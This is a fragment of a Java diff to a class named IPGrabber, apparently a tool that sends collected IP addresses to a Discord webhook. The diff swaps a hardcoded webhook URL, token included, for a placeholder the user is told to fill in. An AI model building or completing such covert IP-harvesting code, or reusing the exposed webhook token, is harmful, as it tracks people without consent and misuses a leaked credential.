@@ -45,7 +45,7 @@ public class IPGrabber {
 	        BufferedReader in = null;
 	        StringBuilder result = new StringBuilder();
 	        try {
-	            URL url = new URI("https://discord.com/api/webhooks/876330874390597662/VgiIB_h98kVCkKW24CagWm0fQNP7k2IKZz7YR-BQTBZrxqw9EhzWBEdQzcEP5hsLxgzz").toURL();
+	            URL url = new URI("<webhook url>").toURL(); // PUT YOUR URL HERE
 	            URLConnection conn = url.openConnection();
 	            conn.setRequestProperty("accept", "*/*");
 	            conn.setRequestProperty("connection", "Keep-Alive");
@@ -67,3 +67,4 @@ public class IPGrabber {
 	        }
 	}
 }
+
